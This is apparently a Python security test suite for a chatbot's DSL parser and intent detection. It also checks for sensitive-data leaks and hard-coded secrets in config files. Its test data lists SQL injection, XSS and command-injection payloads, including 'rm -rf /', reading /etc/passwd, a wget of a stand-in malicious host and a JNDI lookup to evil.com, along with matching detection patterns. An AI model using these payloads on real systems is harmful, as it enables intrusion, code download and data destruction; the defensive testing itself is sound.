#!/usr/bin/env python3
"""
安全测试模块
============

测试系统在安全方面的鲁棒性：
1. 输入验证和注入攻击防护
2. DSL语法安全检查
3. API调用安全测试
4. 敏感信息泄露检测

使用方法:
    python tests/test_security.py
    python tests/test_security.py --include-injection-tests
"""

import sys
import os
import json
import re
import hashlib
from typing import List, Dict, Any, Tuple
from dataclasses import dataclass

# 添加项目路径
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, project_root)
sys.path.insert(0, os.path.join(project_root, 'src'))

# 导入时使用try-catch处理可能的导入错误
try:
    from parser.dsl_parser import DSLParser
    from stubs.mock_llm_client import MockLLMClient
except ImportError as e:
    print(f"Warning: 导入模块失败: {e}")
    # 创建最小实现以便测试框架正常运行
    class DSLParser:
        def parse(self, content):
            return {"intents": {"test": "测试"}, "rules": []}
    
    class MockLLMClient:
        def detect_intent(self, user_input, available_intents):
            return "unknown"

@dataclass
class SecurityTestResult:
    """安全测试结果"""
    test_name: str
    status: str  # "PASS", "FAIL", "WARNING"
    threat_level: str  # "LOW", "MEDIUM", "HIGH", "CRITICAL"
    description: str
    details: Dict[str, Any] = None
    
    def __post_init__(self):
        if self.details is None:
            self.details = {}

class InputValidationTester:
    """输入验证测试器"""
    
    def __init__(self):
        self.parser = DSLParser()
        self.llm_client = MockLLMClient()
        
        # 恶意输入测试用例
        self.malicious_inputs = {
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "admin'; DELETE FROM * WHERE '1'='1'; --",
                "1' UNION SELECT * FROM users --"
            ],
            'xss_injection': [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>"
            ],
            'command_injection': [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& wget malicious.com/script.sh",
                "`whoami`"
            ],
            'buffer_overflow': [
                "A" * 10000,
                "A" * 100000,
                "\x00" * 1000,
                "\xff" * 10000
            ],
            'format_string': [
                "%x%x%x%x",
                "%s%s%s%s",
                "%n%n%n%n",
                "${jndi:ldap://evil.com/}"
            ],
            'null_bytes': [
                "test\x00.txt",
                "\x00admin",
                "file.txt\x00.exe"
            ]
        }
    
    def test_dsl_injection_protection(self) -> List[SecurityTestResult]:
        """测试DSL注入攻击防护"""
        results = []
        
        for attack_type, payloads in self.malicious_inputs.items():
            for payload in payloads:
                try:
                    # 尝试将恶意载荷作为DSL内容解析
                    malicious_dsl = f"""
INTENT malicious: "{payload}"
RULE test_rule
WHEN INTENT_IS malicious
THEN
    RESPOND "{payload}"
"""
                    
                    # 解析DSL
                    parsed_result = self.parser.parse(malicious_dsl)
                    
                    # 检查是否正确处理了恶意输入
                    if self._contains_dangerous_content(str(parsed_result)):
                        results.append(SecurityTestResult(
                            test_name=f"DSL注入防护_{attack_type}",
                            status="FAIL",
                            threat_level="HIGH",
                            description=f"DSL解析器未正确处理{attack_type}攻击载荷",
                            details={"payload": payload, "parsed_result": str(parsed_result)}
                        ))
                    else:
                        results.append(SecurityTestResult(
                            test_name=f"DSL注入防护_{attack_type}",
                            status="PASS",
                            threat_level="LOW",
                            description=f"DSL解析器正确处理了{attack_type}攻击载荷"
                        ))
                        
                except Exception as e:
                    # 异常也是一种防护措施
                    results.append(SecurityTestResult(
                        test_name=f"DSL注入防护_{attack_type}",
                        status="PASS",
                        threat_level="LOW",
                        description=f"DSL解析器通过异常处理阻止了{attack_type}攻击",
                        details={"error": str(e)}
                    ))
        
        return results
    
    def test_user_input_sanitization(self) -> List[SecurityTestResult]:
        """测试用户输入清理"""
        results = []
        
        available_intents = {"greeting": "问候", "product_query": "产品咨询"}
        
        for attack_type, payloads in self.malicious_inputs.items():
            for payload in payloads:
                try:
                    # 测试意图识别是否正确处理恶意输入
                    detected_intent = self.llm_client.detect_intent(payload, available_intents)
                    
                    # 检查返回结果是否安全
                    if detected_intent in available_intents or detected_intent == "unknown":
                        results.append(SecurityTestResult(
                            test_name=f"用户输入清理_{attack_type}",
                            status="PASS",
                            threat_level="LOW",
                            description=f"用户输入清理正确处理了{attack_type}攻击载荷"
                        ))
                    else:
                        results.append(SecurityTestResult(
                            test_name=f"用户输入清理_{attack_type}",
                            status="WARNING",
                            threat_level="MEDIUM",
                            description=f"用户输入清理返回了异常结果：{detected_intent}",
                            details={"payload": payload, "result": detected_intent}
                        ))
                        
                except Exception as e:
                    results.append(SecurityTestResult(
                        test_name=f"用户输入清理_{attack_type}",
                        status="PASS",
                        threat_level="LOW",
                        description=f"用户输入清理通过异常处理阻止了{attack_type}攻击",
                        details={"error": str(e)}
                    ))
        
        return results
    
    def _contains_dangerous_content(self, content: str) -> bool:
        """检查内容是否包含危险元素"""
        dangerous_patterns = [
            r'<script.*?>.*?</script>',
            r'javascript:',
            r'DROP\s+TABLE',
            r'DELETE\s+FROM',
            r'rm\s+-rf',
            r'/etc/passwd',
            r'%[nxsp]',
            r'\x00'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                return True
        
        return False

class DataPrivacyTester:
    """数据隐私测试器"""
    
    def __init__(self):
        self.sensitive_patterns = {
            'phone_number': r'\b1[3-9]\d{9}\b',
            'id_card': r'\b\d{15}|\d{18}\b',
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'credit_card': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
            'api_key': r'[A-Za-z0-9]{32,}',
            'password': r'password\s*[:=]\s*[\'"]?([^\s\'"]+)',
        }
    
    def test_sensitive_data_exposure(self) -> List[SecurityTestResult]:
        """测试敏感数据泄露"""
        results = []
        
        # 模拟包含敏感信息的输入
        test_inputs = [
            "我的手机号是13812345678",
            "我的邮箱是test@example.com",
            "身份证号码是123456789012345678",
            "信用卡号是1234 5678 9012 3456",
            "password: admin123",
            "API key: abc123def456ghi789jkl012mno345pqr678"
        ]
        
        for test_input in test_inputs:
            # 检查是否检测到敏感信息
            detected_types = self._detect_sensitive_data(test_input)
            
            if detected_types:
                results.append(SecurityTestResult(
                    test_name="敏感数据泄露检测",
                    status="WARNING",
                    threat_level="MEDIUM",
                    description=f"输入中检测到敏感信息：{', '.join(detected_types)}",
                    details={"input": test_input, "sensitive_types": detected_types}
                ))
            else:
                results.append(SecurityTestResult(
                    test_name="敏感数据泄露检测",
                    status="PASS",
                    threat_level="LOW",
                    description="未检测到敏感数据泄露"
                ))
        
        return results
    
    def _detect_sensitive_data(self, text: str) -> List[str]:
        """检测文本中的敏感数据"""
        detected = []
        
        for data_type, pattern in self.sensitive_patterns.items():
            if re.search(pattern, text, re.IGNORECASE):
                detected.append(data_type)
        
        return detected

class ConfigSecurityTester:
    """配置安全测试器"""
    
    def __init__(self):
        self.config_files = [
            "src/config/settings.py",
            "tests/test_config.ini",
            "tests/test_data/test_config.ini"
        ]
    
    def test_configuration_security(self) -> List[SecurityTestResult]:
        """测试配置文件安全性"""
        results = []
        
        for config_file in self.config_files:
            config_path = os.path.join(project_root, config_file)
            
            if not os.path.exists(config_path):
                continue
                
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # 检查硬编码敏感信息
                security_issues = self._check_config_security(content)
                
                if security_issues:
                    results.append(SecurityTestResult(
                        test_name=f"配置安全检查_{os.path.basename(config_file)}",
                        status="WARNING",
                        threat_level="MEDIUM",
                        description=f"配置文件存在安全问题：{', '.join(security_issues)}",
                        details={"file": config_file, "issues": security_issues}
                    ))
                else:
                    results.append(SecurityTestResult(
                        test_name=f"配置安全检查_{os.path.basename(config_file)}",
                        status="PASS",
                        threat_level="LOW",
                        description="配置文件安全检查通过"
                    ))
                    
            except Exception as e:
                results.append(SecurityTestResult(
                    test_name=f"配置安全检查_{os.path.basename(config_file)}",
                    status="WARNING",
                    threat_level="LOW",
                    description=f"配置文件读取失败：{str(e)}"
                ))
        
        return results
    
    def _check_config_security(self, content: str) -> List[str]:
        """检查配置内容的安全问题"""
        issues = []
        
        # 检查硬编码API密钥
        if re.search(r'api_?key\s*[:=]\s*[\'"][^\'"\s]{10,}[\'"]', content, re.IGNORECASE):
            issues.append("硬编码API密钥")
        
        # 检查硬编码密码
        if re.search(r'password\s*[:=]\s*[\'"][^\'"\s]{1,}[\'"]', content, re.IGNORECASE):
            issues.append("硬编码密码")
        
        # 检查硬编码数据库连接字符串
        if re.search(r'(mysql|postgres|mongodb)://[^\'"\s]+', content, re.IGNORECASE):
            issues.append("硬编码数据库连接")
        
        # 检查调试模式
        if re.search(r'debug\s*[:=]\s*true', content, re.IGNORECASE):
            issues.append("调试模式启用")
        
        return issues

class SecurityReporter:
    """安全测试报告生成器"""
    
    def __init__(self, output_dir: str = "test_reports"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_security_report(self, results: List[SecurityTestResult]):
        """生成安全测试报告"""
        import time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # 统计各级别威胁数量
        threat_stats = {"LOW": 0, "MEDIUM": 0, "HIGH": 0, "CRITICAL": 0}
        status_stats = {"PASS": 0, "FAIL": 0, "WARNING": 0}
        
        for result in results:
            threat_stats[result.threat_level] += 1
            status_stats[result.status] += 1
        
        # 生成JSON报告
        json_file = os.path.join(self.output_dir, f"security_report_{timestamp}.json")
        report_data = {
            "timestamp": timestamp,
            "summary": {
                "total_tests": len(results),
                "threat_stats": threat_stats,
                "status_stats": status_stats
            },
            "results": [self._result_to_dict(result) for result in results]
        }
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        # 生成HTML报告
        html_file = os.path.join(self.output_dir, f"security_report_{timestamp}.html")
        self._generate_html_report(report_data, html_file)
        
        print(f"\n🔒 安全测试报告已生成:")
        print(f"  JSON: {json_file}")
        print(f"  HTML: {html_file}")
        
        return report_data
    
    def _result_to_dict(self, result: SecurityTestResult) -> Dict[str, Any]:
        """转换结果为字典"""
        return {
            "test_name": result.test_name,
            "status": result.status,
            "threat_level": result.threat_level,
            "description": result.description,
            "details": result.details
        }
    
    def _generate_html_report(self, report_data: Dict[str, Any], html_file: str):
        """生成HTML安全报告"""
        import time
        
        html_content = f"""
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全测试报告</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }}
        .header {{ text-align: center; border-bottom: 2px solid #dc3545; padding-bottom: 20px; margin-bottom: 30px; }}
        .summary {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .stat-card {{ background: #f9f9f9; padding: 15px; border-radius: 5px; text-align: center; min-width: 100px; }}
        .pass {{ color: #28a745; }}
        .warning {{ color: #ffc107; }}
        .fail {{ color: #dc3545; }}
        .low {{ color: #6c757d; }}
        .medium {{ color: #ffc107; }}
        .high {{ color: #fd7e14; }}
        .critical {{ color: #dc3545; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; font-weight: bold; }}
        .details {{ max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 系统安全测试报告</h1>
            <p>生成时间: {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
        </div>
        
        <h2>📊 安全检查概览</h2>
        <div class="summary">
            <div class="stat-card">
                <h3>总测试数</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['total_tests']}</div>
            </div>
            <div class="stat-card pass">
                <h3>通过</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['status_stats']['PASS']}</div>
            </div>
            <div class="stat-card warning">
                <h3>警告</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['status_stats']['WARNING']}</div>
            </div>
            <div class="stat-card fail">
                <h3>失败</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['status_stats']['FAIL']}</div>
            </div>
        </div>
        
        <h2>⚠️ 威胁级别分布</h2>
        <div class="summary">
            <div class="stat-card critical">
                <h3>严重</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['CRITICAL']}</div>
            </div>
            <div class="stat-card high">
                <h3>高危</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['HIGH']}</div>
            </div>
            <div class="stat-card medium">
                <h3>中危</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['MEDIUM']}</div>
            </div>
            <div class="stat-card low">
                <h3>低危</h3>
                <div style="font-size: 2em; font-weight: bold;">{report_data['summary']['threat_stats']['LOW']}</div>
            </div>
        </div>
        
        <h2>🔍 详细测试结果</h2>
        <table>
            <thead>
                <tr>
                    <th>测试项目</th>
                    <th>状态</th>
                    <th>威胁级别</th>
                    <th>描述</th>
                    <th>详情</th>
                </tr>
            </thead>
            <tbody>
"""
        
        for result in report_data['results']:
            status_class = result['status'].lower()
            threat_class = result['threat_level'].lower()
            details_str = json.dumps(result['details'], ensure_ascii=False) if result['details'] else ""
            
            html_content += f"""
                <tr>
                    <td>{result['test_name']}</td>
                    <td class="{status_class}">{result['status']}</td>
                    <td class="{threat_class}">{result['threat_level']}</td>
                    <td>{result['description']}</td>
                    <td class="details" title="{details_str}">{details_str[:50]}...</td>
                </tr>
"""
        
        html_content += """
            </tbody>
        </table>
    </div>
</body>
</html>"""
        
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)

def main():
    """安全测试主入口"""
    import argparse
    
    parser = argparse.ArgumentParser(description='客服机器人系统安全测试')
    parser.add_argument('--include-injection-tests', action='store_true', help='包含注入攻击测试')
    parser.add_argument('--output', default='test_reports', help='报告输出目录')
    
    args = parser.parse_args()
    
    print("🔒 开始系统安全测试...")
    print("=" * 60)
    
    all_results = []
    
    # 输入验证测试
    print("\n🛡️ 执行输入验证安全测试...")
    input_tester = InputValidationTester()
    
    if args.include_injection_tests:
        results = input_tester.test_dsl_injection_protection()
        all_results.extend(results)
        print(f"   DSL注入防护测试: {len(results)}项")
    
    results = input_tester.test_user_input_sanitization()
    all_results.extend(results)
    print(f"   用户输入清理测试: {len(results)}项")
    
    # 数据隐私测试
    print("\n🔐 执行数据隐私安全测试...")
    privacy_tester = DataPrivacyTester()
    results = privacy_tester.test_sensitive_data_exposure()
    all_results.extend(results)
    print(f"   敏感数据泄露测试: {len(results)}项")
    
    # 配置安全测试
    print("\n⚙️ 执行配置安全测试...")
    config_tester = ConfigSecurityTester()
    results = config_tester.test_configuration_security()
    all_results.extend(results)
    print(f"   配置文件安全测试: {len(results)}项")
    
    # 生成报告
    print("\n📋 生成安全测试报告...")
    reporter = SecurityReporter(args.output)
    report_data = reporter.generate_security_report(all_results)
    
    # 输出摘要
    print("\n" + "=" * 60)
    print("🔒 安全测试完成！")
    print(f"总测试项: {report_data['summary']['total_tests']}")
    print(f"通过: {report_data['summary']['status_stats']['PASS']}")
    print(f"警告: {report_data['summary']['status_stats']['WARNING']}")
    print(f"失败: {report_data['summary']['status_stats']['FAIL']}")

if __name__ == "__main__":
    main()